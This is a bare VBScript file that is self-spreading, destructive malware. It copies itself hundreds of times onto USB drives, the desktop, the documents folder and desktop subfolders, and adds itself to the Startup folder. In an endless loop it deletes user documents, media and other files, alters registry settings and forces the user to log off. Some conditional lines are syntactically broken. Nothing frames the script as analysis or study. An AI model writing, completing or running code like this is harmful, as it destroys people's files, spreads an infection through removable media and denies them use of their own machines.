Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strScriptPath = WScript.ScriptFullName

' Specify the folders in which you want to delete files (modify as needed)
foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")

' Get the path to the desktop folder
strDesktopFolder = objShell.SpecialFolders("Desktop")

' Get the path to the documents folder
strDocumentsFolder = objShell.SpecialFolders("MyDocuments")

' Specify the number of copies to create
numCopies = 999

' Find the USB drive
usbDrivePath = ""
Set colDrives = objFSO.Drives

For Each objDrive In colDrives
    If objDrive.DriveType = 1 And objDrive.IsReady Then ' Check if the drive is a removable drive (USB)
        usbDrivePath = objDrive.Path
        Exit For
    End If
Next

' Check if a USB drive was found
If usbDrivePath <> "" Then
    ' Generate copies of the script on the USB drive
    On Error Resume Next ' Ignore errors
    For i = 1 To numCopies
        randomIteration = Int((1000 * Rnd) + 1)

        strCopyPath = usbDrivePath & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
        objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
    Next
    On Error GoTo 0 ' Reset error handling
End If

' Create copies of the script on the desktop and in the documents folder
On Error Resume Next ' Ignore errors
For i = 1 To numCopies
    randomIteration = Int((1000 * Rnd) + 1)

    ' Create a copy of the script on the desktop
    strDesktopCopyPath = strDesktopFolder & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
    objFSO.CopyFile strScriptPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files

    ' Create a copy of the script in the documents folder
    strDocumentsCopyPath = strDocumentsFolder & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
    objFSO.CopyFile strScriptPath, strDocumentsCopyPath, True ' Add "True" to overwrite existing files
Next
On Error GoTo 0 ' Reset error handling

' Add the script to the startup folder
On Error Resume Next ' Ignore errors
startupFolder = objShell.SpecialFolders("Startup")
objFSO.CopyFile strScriptPath, startupFolder & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎.vbs", True ' Add "True" to overwrite existing files
On Error GoTo 0 ' Reset error handling

' Loop indefinitely
Do
    ' Delete all files except VBS files within the specified folders
    For Each folderPath In foldersToDelete
DeleteFilesExceptVBS folderPath
Next

' Set wallpaper
objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True

' Loop through each file in the Desktop folder and delete if it has a specified file extension
For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
    Dim extension
    extension = LCase(objFSO.GetExtensionName(objFile.Name))
    If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Or extension "png" Or extension "log" Or extension "bin" Or extension "bat" Or extension "dll" Then
        objFSO.DeleteFile(objFile)
    End If
Next

' Loop through each folder on the Desktop and delete files within them
For Each objFolder In objFSO.GetFolder(strDesktopFolder).Subfolders
    For Each objFile In objFolder.Files
        objFSO.DeleteFile(objFile.Path)
    Next
Next

' Generate copies of the script within each folder on the Desktop
For Each objFolder In objFSO.GetFolder(strDesktopFolder).Subfolders
    On Error Resume Next ' Ignore errors
    For i = 1 To numCopies
        randomIteration = Int((1000 * Rnd) + 1)
        strCopyPath = objFolder.Path & "\☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" & randomIteration & ".vbs"
        objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
    Next
    On Error GoTo 0 ' Reset error handling
Next

' Remove apps from the taskbar
objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\TaskbarSmallIcons", 1, "REG_DWORD"
objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\MMTaskbarEnabled", 0, "REG_DWORD"

' Log out the current user
objShell.Run "shutdown -l -f", 0, True
Loop

Sub DeleteFilesExceptVBS(folderPath)
On Error Resume Next

Set folder = objFSO.GetFolder(folderPath)
If Err.Number = 0 Then
    For Each file In folder.Files
        Dim extension
        extension = LCase(objFSO.GetExtensionName(file.Path))
        If extension <> "vbs" Then
            objFSO.DeleteFile file.Path
        End If
    Next
    
    ' Recursively delete files in subfolders
    For Each subfolder In folder.Subfolders
DeleteFilesExceptVBS subfolder.Path
Next
End If

On Error GoTo 0
End Sub
